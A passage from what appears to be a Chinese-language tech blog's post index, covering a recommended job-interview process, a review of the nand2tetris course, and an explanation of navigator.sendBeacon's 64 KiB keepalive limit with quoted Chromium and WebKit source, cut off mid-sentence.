第一種可能就是在上一個步驟的時候，面試通知信沒有寫清楚要找誰有些公司可能沒有總機櫃台，也沒有一個專門接待的人，這樣你要求職者問誰？這種狀況最好在通知信上面寫清楚，例如說：到公司以後，跟離門口最近的同事說你是來面試的即可這樣也可以，至少讓他知道他應該要找誰，而不是放求職者在那邊不知所措 還有些是什麼：主管正在開會，可以等一下嗎？如果等個十分鐘以內還好，但如果等太久的話就不行這種也是滿不尊重的，主管今天有會議，那幹嘛在這個時間來找我面試？不能晚個一兩個小時再約嗎？大家都知道會議很可能會 delay，但這應該在約時間之前就先考慮進去，沒有把握的話就不要約 第二種狀況我還真的碰過「今天原本要面試你的人去開會了，那就由我來面試你吧」沒記錯的話大概是類似這樣的話…碰到這種狀況其實就乾脆不要跟求職者講，直接假裝原本就是他來面試還比較好 上面這兩種狀況如果都沒發生，那應該很順利的，求職者一到公司之後就順利的見到了 HR這時候 HR 要做些什麼呢？ 請他填寫資料 說明面試流程 說明公司福利 問求職者有無問題（跟公司有關，HR 可以回答的範圍） 1.的話幾乎每家公司都會有，但我不清楚是法規限制還是慣例表格上有一堆麻煩的東西要填，例如說家人資料、地址等等的如果只是慣例的話，我會建議只填一些必要的東西，節省面試時間不然每次都要填這個落落長的表格，實在是很麻煩（但如果是有相關法規限制，那就沒辦法了） 2.的話我認為也是很重要的一塊，我之前去面試活動通的時候，HR就很專業的跟我講解面試流程有一陣子了所以詳細內容我也忘掉了，不過大概是這樣： 我們公司的面試流程有三關第一關是跟我，我會跟你說明一些公司福利及相關狀況，同時你也可以問我與公司相關的問題第二關是跟 Android 工程師面試，主要是針對你的技術能力做討論第三關（如果上一關有過）會跟 CEO 面試，這就是最後一關了 3.的話一般勞基法規定的就不用講了，有額外的才值得提出來講公司福利就是要大方的讓求職者全部知道阿，有些公司不知道為什麼，就是不說明清楚像是我現在待的公司：隆中網絡，公司福利有 年假 12 天（勞基法規定 7 天） 免費供應早餐 國外旅遊補助 多益學分補助（依成績加薪） 這些都是 HR 可以先跟求職者說明的內容 HR 面完之後就是職務相關的負責人來面試了問的問題會是一些專業技能之類的這部份因為我這篇講的是「流程」而非內容，於是就略過了 面試後經歷過重重難關，面試終於結束我認為在面試結束的時候，面試官可以多給一些有用的資訊而不是萬年老梗的「我跟同事再討論一下，之後會再通知你」 面試結果通知時間 未錄取是否會通知 面試完以後對求職者來說，最重要的就是面試結果我認為通知以上兩點事項是很有幫助的1.的話可以不用讓求職者一直等等等2.的話也是，比起「無聲卡」，感謝信會是比較好的選擇，可以的話我也認為說明理由會比較好 ##總結俗話說的好：將心比心，把人放在第一位；你自己想要怎樣的面試，就試著把自己公司的面試流程也調整成那樣把上面說的那些整理一下，大概就會變成這樣（以第一人稱撰寫）： 有天我投了履歷給A公司，應徵工程師的職位，過幾天之後就收到了回信： 您好，收到了您的履歷，本公司對您的專業技能十分感興趣，希望邀請您來面試公司地點：台北市台北路 3 號 14 樓（全家便利商店樓上，需在一樓櫃檯換證，搭電梯到 14 樓之後右轉，跟總機說您是來面試的即可）應徵職務：工程師聯絡電話：02-2222-2222(#621) 陳先生時間：請在以下的時段內挑選您方便的三個時段並回信給我們，確認以後會再回信給您1&#x2F;1 早上 11 點1&#x2F;1 下午 3 點1&#x2F;4 早上 11 點1&#x2F;4 下午 3 點1&#x2F;4 下午 5 點1&#x2F;5 早上 11 點1&#x2F;6 早上 11點…(略) 於是我就挑了三個時段並且回覆，不久後收到了回信： 您好，以下是您的面試資訊：公司地點：台北市台北路 3 號 14 樓（全家便利商店樓上，需在一樓櫃檯換證，搭電梯到 14 樓之後右轉，跟總機說您是來面試的即可）應徵職務：工程師聯絡電話：02-2222-2222(#621) 陳先生時間：1&#x2F;1 早上 11 點面試流程大約 1 小時，前面 20 分鐘會填寫基本資料以及一份筆試考卷（範圍是基本程式能力）無需自備履歷，我們這邊會提供；但可以攜帶任何可證明您的專業技能或工作成果的資料 到 1&#x2F;1 面試的時候，HR 就請我到會議室裡面填資料、寫考卷，寫完之後大致跟我說明了公司狀況、公司福利，以及講解了面試流程，像是面試總共有三關，最後也讓我問問題，確認沒問題之後，就找技術負責人來跟我面試了。 跟技術負責人面試完以後，他跟我說： 今天的面試就到這邊了，我們會再討論是否邀請你來參加第三關的面試結果大約會在 3 天之後通知你，最晚下禮拜五以前無論結果是什麼，都會寄信通知 大概過五天以後我就收到這樣的信件： 您好，很感謝您來本公司應徵工程師的職位，但很可惜的，我們認為您的專業知識部分未到達此職位的標準為不耽誤您其他公司轉任機會，特以此信件通知（以下官腔、制式說法省略） 如果有公司這樣面試我，就算沒錄取，我也會推薦這間公司。這不是有沒有錄取的問題，而是有沒有被尊重的問題。","link":"/2016/01/19/my-ideal-interview-process/"},{"title":"From Nand To Tetris：想理解電腦運作，就先做出一台吧！","text":"前言一直以來我都很推薦一門課叫做 CS50，原因是又深又廣，而且教得深入淺出，作業又紮實，是很棒的一堂課。 而今天要介紹的這門課，我會形容它是「電腦底層版的 CS50」。 From Nand to Tetris 由兩位教授 Shimon Schocken 與 Noam Nisan 開設，與 CS50 一樣，一開始都是大學的課程，後來才轉為線上課程，在官網上這堂課還有一個副標題：「Building a Modern Computer From First Principles」，沒錯，要建一台電腦出來。 這堂課分為兩個部分，Part1 是 From Nand To HACK，Nand 是一個邏輯閘的名稱，就像 Or、And、Xor 這些也都是邏輯閘。而 HACK 是在 Part1 最後會建造出來的電腦。因此 Part1 就是帶你從最基本的邏輯閘開始，一步步把一台電腦建立出來，所以是很偏向硬體的部分。 Part2 則是 From HACK To Tetris，以電腦為基礎往軟體去延伸，會介紹到 Compiler 與作業系統等等的軟體。 課程的概觀可以參考這張圖片： 從知道這門課以來我就一直很想修但沒有付諸行動，前陣子終於認真了一段時間把課程修完，名不虛傳，果然是一門好課！因此在這邊寫一篇介紹兼推坑文，希望能推廣給大家。 為什麼想修這門課？七年前我還是大一的時候，就跑去修了資工系的「計算機組織與組合語言」還有資管系的「計算機組織與結構」，會修這兩門課的原因很簡單，因為我有組合語言情節。 雖然說自己不太會寫組語，但覺得會寫組語很帥。不管是什麼 C++、Go、Rust 還是我自己最擅長的 JavaScript，在我心目中都比不過組合語言。我也不知道為什麼，但覺得會寫組語就是帥。 為了學還有寫組合語言，就修了那兩門課。那兩門課前半段都在講一些電腦比較底層的東西，我到現在還是沒搞懂，前兩次作業都拿了很低分，那些電路圖從來沒看懂過，而課程後半段進入到組合語言之後就如魚得水了，終於到我喜歡且比較擅長的主題。 總之呢，在這兩門課上面除了組合語言以外，我其實沒什麼太大的收穫，因為好多東西都聽不懂。上完之後，我知道有 register，我知道有 L1 L2 cache，我知道有 branch prediction，也知道 instruction pipeline，但我還是不知道電腦到底怎麼做的，不知道怎麼執行。 但因為之後沒有要考資工所，工作上也碰不到這麼底層的東西，就漸漸沒有去注意了。可是在我心裡，還是想知道電腦到底怎麼做出來的。 長大以後無意間聽說了 From Nand To Tetris（以下簡稱 nand2tetris）這門課程，帶你從最簡單的邏輯閘開始，把電腦建出來，然後在這台電腦上跑一個俄羅斯方塊的程式，哇，聽起來超棒。 這就是我想修這門課的理由，我想知道電腦到底怎麼做出來的。我想知道 CPU 裡面到底有什麼，而不只是一個黑盒子。 課程到底上了些什麼？課程有六週，分成七個單元（單元 0~6），第 0 個單元是課程的介紹，底下我直接依照各個單元來跟大家介紹。 Unit0：課程介紹這個單元除了介紹課程以外，也介紹了兩個很重要的概念：Abstraction（抽象）與 Implementation（實作）。 直接舉個例子會比較容易懂，例如說今天給你一台電腦，要你在上面寫個輸出 Hello World 的程式，你不用去擔心print到底怎麼把東西印出來，你可以直接假設它就是會印出東西。換句話說，你無須擔心print是怎麼被實作的（Why），只需要知道它可以做什麼就好（What）。 大概就像是疊床架屋一樣，你把第一層蓋好之後就蓋第二層，蓋到第十層的時候，你不用擔心前九層是怎麼蓋的，你只要知道前九層已經蓋好了就可以了，因為你現在的任務是蓋第十層。 這樣的概念在電腦科學裡面超級重要，因為電腦就是個分很多層的東西，從最底層的電子電路，再到基本邏輯閘（And、Or 與 Not），到比較複雜的硬體（Register、ALU），再到更複雜的硬體（CPU、RAM）等等，這些都是一層一層往上建構的。 而這堂課就是帶你從最底層開始，一路往上建，讓你知道一台電腦是由哪些東西所組成的。 這邊的「最底層」指的是邏輯閘，你不用知道在實體世界的電路到底怎麼接的（因為那是電子或是電機的領域了），也不用知道「輸入」到底怎麼輸入，「輸出」到底會輸出到哪裡。 Unit1：Boolean functions ans logic gate這一週會介紹基本的邏輯閘，例如說 Or, And, Xor, Nand 以及 Nor 等等，讓你知道他們的功用，還會教你畫真值表（Truth table），讓你熟悉這些基本邏輯。 而這週的作業是只給你一個邏輯閘 Nand，要你做出以下 15 種電路： Not And Or Xor Mux DMux Not16 And16 Or16 Mux16 Or8Way Mux4Way16 Mux8Way16 DMux4Way DMux8Way 那要怎麼做呢？用課程團隊自己做的 HDL（hardware description language） 還有硬體模擬器就可以了。 舉例來說，若是想要用 Nand 做出 Not，可以這樣寫： CHIP Not &#123; &#x2F;&#x2F; 我要寫一個叫做 Not 的 chip IN in; &#x2F;&#x2F; 輸入的訊號叫做 in OUT out; &#x2F;&#x2F; 輸出叫做 out PARTS: Nand (a&#x3D;in, b&#x3D;in, out&#x3D;out); &#x2F;&#x2F; 把 in 跟 in 傳進 Nand chip，輸出到 out &#125; 如果我的輸入是 0，那 in 就是 0，而 0 Nand 0 的結果是 1，所以 out 就會是 1，就是 0 經過 not 以後的結果。若是輸入是 1，1 Nand 1 是 0，out 就會是 0。 因此，我們可以只用 Nand 這個邏輯閘就完成 Not 的功能。 這一個單元就是讓你去熟悉 HDL 的寫法，並且試著把電路組合起來。在測試的部分，課程團隊也貼心地提供了自製的硬體模擬器，讓你可以載入電路，很方便地去測試到底是不是對的： （圖片取自官網） Unit2：Boolean arithmetic and the ALU這一週要來介紹電腦中的數字運算了，會講到電腦怎麼表示數字，也就是大家熟知的二進位，也會提到負數的表示方法（二的補數），作業是要做出以下的電路： HalfAdder FullAdder Add16 Inc16 ALU ALU 的全名是 Arithmetic Logic Unit，有修過相關課程的人應該對這個不陌生，總之就是拿來做算術運算的一個電路，輸入兩個數字以及你想進行的操作，就會輸出結果。 Unit3：Memory前兩週的難度都還好，這一週我覺得難度突然上升，主因是引入了一個新的概念：Sequential logic（序向邏輯電路）。 在前幾個單元所設計的電路，都叫做 Combinational logic（組合邏輯電路），簡單來說呢，可以用這樣的式子來表示：out[t] = function(in[t])，你在某個時間點 t 輸入值，就會回傳相對應的結果，一切十分簡單明瞭。 但是 Sequential logic 不一樣，它的輸出不只與當前的輸入有關，與「以前的輸入」也有關，換句話說，Sequential logic 有記憶東西的能力。 以程式來做比喻，Combinational logic 大概就像是 pure function，你給一樣的 input，一定會產生一樣的 output；而 Sequential logic 則是有 side-effect 的 function。 這一週的作業是要做出以下電路： 1 bit register 16-bit register RAM8（16-bit &#x2F; 8-register memory） RAM64 RAM512 RAM4K RAM16K PC（Program Counter） Unit4：Machine Language其實上個單元對於電腦怎麼做的只差最後一個步驟了，但這週先暫時脫離一下硬體與電路，先假設電腦已經做好了，那應該要怎麼讓電腦去執行程式？ 解答應該大家都聽過，就是 machine language，機器語言，是 CPU 唯一看得懂的語言，由 0101010 組成。但是要你直接寫 machine language 有點太殘酷，所以官方提供了 Assembler，讓你只要寫 assembly language 就好。 因此這週就是要來寫 assembly language，讓你熟悉 HACK 這台電腦的指令格式。作業有兩個，一個是輸入兩個數字以後回傳相乘的結果，另一個是互動式的程式，按下鍵盤時螢幕會變黑，放開時會變白。 這週我覺得比較有趣的是講解了 input 與 output 的原理。舉例來說，鍵盤打字之後電腦要怎麼知道剛剛按了什麼按鍵？可以很簡單地簡化成這樣：每當鍵盤被按下，就會傳送一個訊號到電腦，並且在某一個特定記憶體位置放入剛剛按的按鍵的代碼，這樣子我只要去那個記憶體位置看有沒有值，就知道使用者有沒有按按鍵了。 輸出也是一樣，有某個記憶體區塊，每一個 bit 代表一個 pixel，1 代表黑色，0 代表白色，而螢幕會用很快的頻率（例如說一秒 50 次之類的）去讀取這塊記憶體，並且把該顯示的在螢幕上顯示出來。 如此一來，輸入與輸出都可以透過記憶體的特定位置來達成。 Unit5：Computer Architecture這週把之前第三週沒有做完的電腦繼續做，要來做 Memory 以及 CPU，同時也告訴你電腦是怎麼執行這些指令的。這個單元的內容滿重要的，把之前第三週所做出來的東西整合起來，最後做成了一部電腦。 Unit6：Assembler第四週的時候我們用了官方提供的 assembler 轉成機器碼，而 part1 的最後一週就是要讓你自己寫 assembelr，自己把組合語言轉成機器語言。 若是不會寫程式的話，官方也提供了另外一種交作業的方式，那就是手動翻譯。自己把每一行程式碼查表然後翻成機器語言。 做到這邊，七個單元就都結束了，在這七個單元裡面做出了很多的電路，最後做出了 CPU、Memory 以及一台電腦，也知道要怎麼在這台電腦上執行指令，知道怎麼寫一個 assembler。 課程心得這堂課與 CS50 一樣，都標榜著毫無基礎也可以上。但我之前就說過了，我不認為 CS50 真的適合所有沒有基礎的人，對有些人來說，梯度依舊太高，難度上升太快，還有改進的空間。 那這堂課呢？我覺得新手可以嘗試看看，因為真的不需要任何程式基礎，但我猜作業的部分依舊會卡關的滿嚴重的。雖然說不需要程式基礎，但有些作業還是很吃你的邏輯跟思考能力，一個恍神就忘記自己現在想到哪裡了。 在修這堂課的過程中，有幾個讓我驚豔到的點，以下有雷，可能會破壞修課的樂趣，可自行斟酌是否觀看。 第一個是 HACK 的機器語言有分兩種，一種是 A-instruction，另一種是 C-instruction，區別的方法是最高位，一個是 0 一個是 1。前者是拿來載入一個 15bit 的值用的。 第四週在寫組合語言時沒注意到為什麼，一直到第五週做 CPU 的時候才恍然大悟。因為 A-instruction 要載入一個 15bit 的值，但 register 是 16bit，原本想說要怎麼把 15bit 多加一個 bit 變成 16bit。後來才突然想到 A-instruction 因為是 0 開頭，所以整個 instruction 直接丟到 register 去就好，值是一樣的。 再來是第二週的 ALU，它可以做的操作很多，原本一直很好奇要怎樣才能指定做哪個操作，如果是程式語言，我的想像會是這樣： if (op === 1) &#123; return x &#125; else if (op === 2) &#123; return y &#125; else if (op === 3) &#123; return x+y &#125; else if (op === 4) &#123; return x&amp;y &#125; 可是電路基本上沒有這種 if 可以用，那該怎麼辦呢？ 結果答案令我大吃一驚，是透過 6 個 control bit 對 input 做操作，而這 6 個 bit 的組合就可以產生出不同種想要的結果，詳情可見下圖： 而 ALU 的另外兩個 output：ng（輸出是否為負數）與 zr（輸出是否為零）原本看似無用，但其實是為了之後會碰到的 jump 做準備，這也是課程上到後面才會知道的事情。 總之呢，這堂課我覺得安排得很好，從最基礎的電路開始一直慢慢變複雜，同時也讓你學會機器語言跟組合語言，對電腦底層的東西熟悉了許多。 接著來講一下身為老師，這堂課裡面有哪些東西是值得在教學上借鏡的。 第一是客製化的工具，例如說他們為了這堂課特別開發出的 HDL 跟硬體模擬器，就是為了讓毫無基礎的初學者也能方便學習，這個很值得參考。 第二是作業的批改方式，在作業的資料夾裡面其實都有附上相對應的測試檔，藉由測試檔，學生就可以自己確認是否正確。 第三是作業的替代方案，在最後一週的作業裡，特別為不會寫程式的同學準備了另外一個方案，那就是手動翻譯程式碼，這個也可以學起來。 第四是課程的編排，雖然有講到電路但不會講到太深，因為太深的話就是電子電機的領域了，而不斷往前推進的課程編排也很棒，從 Nand 開始一路做到 CPU。 第五是課程順序的選擇，前幾週都是 bottom-up，由下往上慢慢建立觀念，到第四週突然由上往下，先寫組合語言再去組電腦，這樣的編排反而會讓學生更有感，在做電腦的時候已經對那些 machine code 有一定的熟悉程度。 第六是常見問題的處理方式，在每一個單元最後都有一個 Perspectives 的影片，由兩位教授來回答常見問題，利用這樣的方式統一回答省了滿多時間。 結語無論你有沒有程式基礎，我覺得都可以試試看這堂課，在此誠心推薦給大家。 我自己是上 Coursera 的版本，完全免費，但若是要改作業拿證書的話要付 50 塊美金，為了支持這個課程我是二話不說就付了，不過要不要購買大家可以自己斟酌。 然後這只是 part1 而已，明年我要繼續來上 part2，等 part2 上完再來跟大家分享心得。之前金門大學資工系的教授陳鍾誠也有寫過心得文：Nand2Tetris 慕課記 – 從邏輯閘到方塊遊戲，有興趣的朋友也可以參考看看。 最後，別再猶豫了，趕快去修。","link":"/2019/12/26/nand2tetris-introduction/"},{"title":"navigator.sendBeacon 的 64KiB 限制與底層實作","text":"當你想在網頁上向 server 發送一些 tracking 相關的資訊時，比起直接用 fetch 送出請求，有另一個通常會被推薦的選擇：navigator.sendBeacon。 為什麼會推薦這個呢？ 因為如果是用一般送出請求的方法，在使用者把頁面關掉或是跳轉的時候可能會有問題，例如說剛好在關掉頁面時發送請求，這個請求可能就送不出去，隨著頁面關閉一起被取消了。 雖然說可以利用一些方法嘗試強制送出請求，但這些方法通常都會傷害使用者體驗，例如說強制讓頁面晚一點關閉，或是送出一個同步的請求之類的。 而 navigator.sendBeacon 就是為了解決這個問題而生的。 就如同 spec 上所寫的： This specification defines an interface that web developers can use to schedule asynchronous and non-blocking delivery of data that minimizes resource contention with other time-critical operations, while ensuring that such requests are still processed and delivered to destination 此規範定義了一個 interface，供網頁開發者用於安排非同步且非阻塞的數據傳輸，以最大限度地減少與其他時間敏感操作的資源競爭，同時確保這些請求仍能被處理並傳遞到目標位置。 而使用的方式也非常簡單： navigator.sendBeacon(\"/log\", payload); 就會發送一個 POST 的請求到 /log 去。 雖然簡單易用，但需要注意的一點是，送出的 payload 是有大小限制的，而且這個限制不是單一請求的限制。 navigator.sendBeacon 的 payload 限制sendBeacon 的 payload 上限是 64 KiB，等同於 65536 個 bytes，如果 payload 都是由英文字組成的話，因為每一個是一個 byte，就是 65536 個字。 如果超過這個大小，你會發現請求送不出去，永遠處於 pending 狀態： &lt;script> navigator.sendBeacon(\"/log\", 'A'.repeat(65536 + 1)); &lt;/script> 而且這個限制其實並不是限制單一請求，而是背後有個 queue，這個 queue 只要超過 65536 bytes 就不接受新的東西了。 舉例來說，當我們連續送出 8 個 10000 字的請求時： &lt;script> for(let i=1; i&lt;=8; i++) &#123; navigator.sendBeacon(\"https://httpstat.us/200?log\"+i, 'A'.repeat(10000)); &#125; &lt;/script> 你會發現最後兩個一直處於 pending 狀態，送不出去： 這是因為前六次 sendBeacon 已經把 queue 填到 60000 了，因此最後兩次都塞不下，所以無法接受新的請求，就會永遠處於 pending，就會 queue 空了也不會主動再塞進去。 不過嚴格來講這其實也不是 sendBeacon 的問題，而是 fetch 加上 keepalive 會有的限制。事實上，navigator.sendBeacon 的底層就是 fetch 加上 keepalive。 navigator.sendBeacon 的規格與 Sentry 的小故事在規格的段落 3.2 Processing Model 的第六步中，就有提到剛剛講的 queue： 如果判斷塞不進去 queue 的話，sendBeacon 會回傳 false。 其實這就是 payload 碰到問題時的解法，在呼叫 sendBeacon 之後判斷回傳值是否為 false，是的話就進行處理，看是要 fallback 成一般的 fetch，還是自己再做個重試的機制。 而第七步則是 sendBeacon 主要做的事情，新建一個 keepalive 的請求然後送出： 而 fetch + keepalive 的 payload 限制就是 64 KiB，這是有寫在 spec 裡的： 專門做 error tracking 的服務 Sentry 以前其實就碰過這問題，在 2018 年時有人發現 Sentry 在 fetch 時會預設打開 keepalive，導致有些超過 65536 bytes 的請求送不出去，因此把這個 flag 給拿掉了： 來源：When fetch is used keepalive is the default, and Chrome only allows a POST body &lt;&#x3D; 65536 bytes in that scenario #1464，拿掉的 PR：ref: Remove keepalive:true as a default and document payload size #1496 兩年後的 2020 年，有人發現了 keepalive 的規格以及正確用法：Fetch KeepAlive #2547，提議在 payload 許可之下用 keepalive，超過才不用，而不是像當時全部都不用。 但當時並沒有任何動作，是又過了兩年，在 2022 年時，有人發現 Chrome 在 navigation 的時候會取消所有請求，因此有些請求送不出去，才想到要利用 keepalive 來解決。 因此在 2022 年 9 月時，才又把它加了回去，並且留下精闢的註解： feat(browser): Use fetch keepalive flag #5697 // Outgoing requests are usually cancelled when navigating to a different page, causing a \"TypeError: Failed to // fetch\" error and sending a \"network_error\" client-outcome - in Chrome, the request status shows \"(cancelled)\". // The `keepalive` flag keeps outgoing requests alive, even when switching pages. We want this since we're // frequently sending events right before the user is switching pages (eg. whenfinishing navigation transactions). // Gotchas: // - `keepalive` isn't supported by Firefox // - As per spec (https://fetch.spec.whatwg.org/#http-network-or-cache-fetch), a request with `keepalive: true` // and a content length of > 64 kibibytes returns a network error. We will therefore only activate the flag when // we're below that limit. keepalive: request.body.length &lt;= 65536, 中文機翻： 當切換到不同頁面時，未完成的請求通常會被取消，進而導致「TypeError: Failed to fetch」錯誤，並出現「network_error」。在 Chrome 中，請求狀態會顯示「(cancelled)」。keepalive 標誌可以讓未完成的請求在頁面切換時繼續保持活動狀態。由於我們經常在使用者切換頁面前傳送事件，因此需要這個功能。 需要注意： Firefox 不支援 keepalive。 根據規範，如果請求設定了 keepalive: true 並且內容長度超過 64 KiB，將會返回網路錯誤。因此，我們只會在請求內容長度低於該限制時啟用此標誌。 但故事還沒完，就像我剛才提到的，這個 65536 的限制並不只是單個請求，而是有個 queue，因此這樣做是不夠的。半年之後，Sentry 也注意到了這個問題，加上了計算 queue size 的邏輯，讓整個機制變得更加穩健：fix(browser): Ensure keepalive flag is correctly set for parallel requests #7553 如果之後有想要實作類似的東西，可以直接參考上面 Sentry 的 PR。 sendBeacon 的實作Chromium 的 sendBeacon 實作最後我們來看一下 sendBeacon 底層的實作，先從 Chromium 開始，我以寫文章時最新的穩定版 131.0.6778.205 為例，相關程式碼在：third_party&#x2F;blink&#x2F;renderer&#x2F;modules&#x2F;beacon&#x2F;navigator_beacon.cc 我擷取其中一小段核心程式碼： bool NavigatorBeacon::SendBeaconImpl( ScriptState* script_state, const String&amp; url_string, const V8UnionReadableStreamOrXMLHttpRequestBodyInit* data, ExceptionState&amp; exception_state) &#123; ExecutionContext* execution_context = ExecutionContext::From(script_state); KURL url = execution_context->CompleteURL(url_string); if (!CanSendBeacon(execution_context, url, exception_state)) &#123; return false; &#125; bool allowed; LocalFrame* frame = GetSupplementable()->DomWindow()->GetFrame(); if (data) &#123; switch (data->GetContentType()) &#123; // [...] case V8UnionReadableStreamOrXMLHttpRequestBodyInit::ContentType:: kUSVString: UseCounter::Count(execution_context, WebFeature::kSendBeaconWithUSVString); allowed = PingLoader::SendBeacon(*script_state, frame, url, data->GetAsUSVString()); break; &#125; &#125; else &#123; allowed = PingLoader::SendBeacon(*script_state, frame, url, String()); &#125; if (!allowed) &#123; UseCounter::Count(execution_context, WebFeature::kSendBeaconQuotaExceeded); &#125; return allowed; &#125; 開頭的 CanSendBeacon 基本上就是檢查 URL 是否合法而已，合法的話繼續往下走，會判斷要送出的 payload 的 content type，而實際送出是在 PingLoader::SendBeacon 這個方法裡面。 除此之外可以在程式碼裡面看到 UseCounter::Count，這個是 Chromium 用來追蹤某些功能的使用頻率時會用到的。 PingLoader::SendBeacon 的實作在 third_party&#x2F;blink&#x2F;renderer&#x2F;core&#x2F;loader&#x2F;ping_loader.cc： bool SendBeaconCommon(const ScriptState&amp; state, LocalFrame* frame, const KURL&amp; url, const BeaconData&amp; beacon) &#123; if (!frame->DomWindow() ->GetContentSecurityPolicyForWorld(&amp;state.World()) ->AllowConnectToSource(url, url, RedirectStatus::kNoRedirect)) &#123; // We're simulating a network failure here, so we return 'true'. return true; &#125; ResourceRequest request(url); request.SetHttpMethod(http_names::kPOST); request.SetKeepalive(true); request.SetRequestContext(mojom::blink::RequestContextType::BEACON); beacon.Serialize(request); FetchParameters params(std::move(request), ResourceLoaderOptions(&amp;state.World())); // The spec says: // - If mimeType is not null: // - If mimeType value is a CORS-safelisted request-header value for the // Content-Type header, set corsMode to \"no-cors\". // As we don't support requests with non CORS-safelisted Content-Type, the // mode should always be \"no-cors\". params.MutableOptions().initiator_info.name = fetch_initiator_type_names::kBeacon; frame->Client()->DidDispatchPingLoader(url); FetchUtils::LogFetchKeepAliveRequestMetric( params.GetResourceRequest().GetRequestContext(), FetchUtils::FetchKeepAliveRequestState::kTotal); Resource* resource = RawResource::Fetch(params, frame->DomWindow()->Fetcher(), nullptr); return resource->GetStatus() != ResourceStatus::kLoadError; &#125; 開頭先檢查是否違反 CSP，如果沒有違反，就送出一個 keepalive 的請求，然後回傳是否成功。 值得注意的是在同個檔案中，也有另一個功能做了類似的事情，叫做 PingLoader::SendLinkAuditPing。在 &lt;a&gt; 標籤上有個屬性叫做 ping，當使用者點了連結，瀏覽器就會發送一個請求到 ping 所指定的位置： &lt;a href=\"https://example.com\" ping=\"https://blog.huli.tw\" >click me &lt;/a> 這背後一樣是用 keepalive 的 fetch 來實作的： void PingLoader::SendLinkAuditPing(LocalFrame* frame, const KURL&amp; ping_url, const KURL&amp; destination_url) &#123; if (!ping_url.ProtocolIsInHTTPFamily()) return; ResourceRequest request(ping_url); request.SetHttpMethod(http_names::kPOST); request.SetHTTPContentType(AtomicString(\"text/ping\")); request.SetHttpBody(EncodedFormData::Create(base::span_from_cstring(\"PING\"))); request.SetHttpHeaderField(http_names::kCacheControl, AtomicString(\"max-age=0\")); request.SetHttpHeaderField(http_names::kPingTo, AtomicString(destination_url.GetString())); scoped_refptr&lt;const SecurityOrigin> ping_origin = SecurityOrigin::Create(ping_url); if (ProtocolIs(frame->DomWindow()->Url().GetString(), \"http\") || frame->DomWindow()->GetSecurityOrigin()->CanAccess(ping_origin.get())) &#123; request.SetHttpHeaderField( http_names::kPingFrom, AtomicString(frame->DomWindow()->Url().GetString())); &#125; request.SetKeepalive(true); request.SetReferrerString(Referrer::NoReferrer()); request.SetReferrerPolicy(network::mojom::ReferrerPolicy::kNever); request.SetRequestContext(mojom::blink::RequestContextType::PING); FetchParameters params( std::move(request), ResourceLoaderOptions(frame->DomWindow()->GetCurrentWorld())); params.MutableOptions().initiator_info.name = fetch_initiator_type_names::kPing; frame->Client()->DidDispatchPingLoader(ping_url); FetchUtils::LogFetchKeepAliveRequestMetric( params.GetResourceRequest().GetRequestContext(), FetchUtils::FetchKeepAliveRequestState::kTotal); RawResource::Fetch(params, frame->DomWindow()->Fetcher(), nullptr); &#125; Safari 的 sendBeacon 實作Safari 的實作在 WebKit&#x2F;Source&#x2F;WebCore&#x2F;Modules&#x2F;beacon&#x2F;NavigatorBeacon.cpp： ExceptionOr&lt;bool> NavigatorBeacon::sendBeacon(Document&amp; document, const String&amp; url, std::optional&lt;FetchBody::Init>&amp;&amp; body) &#123; URL parsedUrl = document.completeURL(url); // Set parsedUrl to the result of the URL parser steps with url and base. If the algorithm returns an error, or if // parsedUrl's scheme is not \"http\" or \"https\", throw a \"TypeError\" exception and terminate these steps. if (!parsedUrl.isValid()) return Exception &#123; ExceptionCode::TypeError, \"This URL is invalid\"_s &#125;; if (!parsedUrl.protocolIsInHTTPFamily()) return Exception &#123; ExceptionCode::TypeError, \"Beacons can only be sent over HTTP(S)\"_s &#125;; if (!document.frame()) return false; if (!document.shouldBypassMainWorldContentSecurityPolicy() &amp;&amp; !document.checkedContentSecurityPolicy()->allowConnectToSource(parsedUrl)) &#123; // We simulate a network error so we return true here. This is consistent with Blink. return true; &#125; ResourceRequest request(parsedUrl); request.setHTTPMethod(\"POST\"_s); request.setRequester(ResourceRequestRequester::Beacon); if (RefPtr documentLoader = document.loader()) request.setIsAppInitiated(documentLoader->lastNavigationWasAppInitiated()); ResourceLoaderOptions options; options.credentials = FetchOptions::Credentials::Include; options.cache = FetchOptions::Cache::NoCache; options.keepAlive = true; options.sendLoadCallbacks = SendCallbackPolicy::SendCallbacks; if (body) &#123; options.mode = FetchOptions::Mode::NoCors; String mimeType; auto result = FetchBody::extract(WTFMove(body.value()), mimeType); if (result.hasException()) return result.releaseException(); auto fetchBody = result.releaseReturnValue(); if (fetchBody.isReadableStream()) return Exception &#123; ExceptionCode::TypeError, \"Beacons cannot send ReadableStream body\"_s &#125;; request.setHTTPBody(fetchBody.bodyAsFormData()); if (!mimeType.isEmpty()) &#123; request.setHTTPContentType(mimeType); if (!isCrossOriginSafeRequestHeader(HTTPHeaderName::ContentType, mimeType)) &#123; options.mode = FetchOptions::Mode::Cors; options.httpHeadersToKeep.add(HTTPHeadersToKeepFromCleaning::ContentType); &#125; &#125; &#125; auto cachedResource = document.protectedCachedResourceLoader()->requestBeaconResource(&#123; WTFMove(request), options &#125;); if (!cachedResource) &#123; logError(cachedResource.error()); return false; &#125; ASSERT(!m_inflightBeacons.contains(cachedResource.value().get())); m_inflightBeacons.append(cachedResource.value().get()); cachedResource.value()->addClient(*this); return true; &#125; 可以看到整個流程與 Chromium 是差不多的，先檢查 URL 的合法性，接著檢查 CSP，然後送出一個 keepalive 的請求。 這呼應到我們之前所說的以及規格上寫的，sendBeacon 底層就是個 keepalive 的 fetch。那 keepalive queue 大小超過的原始碼會在哪裡呢？ 從實作中可以看出如果 queue 的大小超過了，八成就是這一段出錯，因為只有這邊會回傳 false： auto cachedResource = document.protectedCachedResourceLoader()->requestBeaconResource(&#123; WTFMove(request), options &#125;); if (!cachedResource) &#123; logError(cachedResource.error()); return false; &#125; 因此可以往 requestBeaconResource 下去追蹤。除此之外，我們也可以從另一個方向來追蹤原始碼在哪一段。 還記得剛剛那個送出 8 個長度 10000 的字串的範例嗎？在 Chrome 上只會看到請求變成 pending，但是在 Safari 上會出現貼心的提示： Beacon API cannot load https://httpstat.us/200?log7. Reached maximum amount of queued data of 64Kb for keepalive requests 直接用這個錯誤訊息就可以找到相關的原始碼，在 WebKit&#x2F;Source&#x2F;WebCore&#x2F;loader&#x2F;cache&#x2F;CachedResource.cpp： if ( m_options.keepAlive &amp;&amp; type() != Type::Ping &amp;&amp; !cachedResourceLoader.keepaliveRequestTracker().tryRegisterRequest(*this) ) &#123; setResourceError(&#123; errorDomainWebKitInternal, 0, request.url(), \"Reached maximum amount of 